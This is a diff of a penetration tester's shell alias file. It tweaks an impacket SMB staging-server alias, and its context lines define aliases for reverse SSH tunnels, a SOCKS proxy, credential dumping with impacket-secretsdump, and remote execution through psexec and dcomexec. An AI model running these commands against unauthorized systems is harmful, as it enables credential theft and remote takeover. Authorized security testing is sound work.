@@ -364,7 +364,7 @@ alias ssh-remote-portfwd="ssh -N -R $LHOST:$LPORT:$RHOST:$RPORT $SUSER@$LHOST"
 alias ssh-socks4proxy="ssh -N -D $LHOST:$LPORT $SUSER@$SPROXY"
 
 #impacket
-alias ip-launchsmbserver='smbserver.py NOPEROPE /offsec/stage'
+alias ip-launchsmbserver='echo Launching impacket smbserver for /offsec/stage && smbserver.py NOPEROPE /offsec/stage -smb2support'
 alias ip-secretsdump="impacket-secretsdump $RUSER:$RPASS@$RHOSTS -outputfile impacket-secretsdump"
 alias ip-dcomexec="dcomexec.py -object MMC20 $RUSER:$RPASS@$RHOST"
 alias ip-psexec="psexec.py $RUSER:$RPASS@$RHOST"
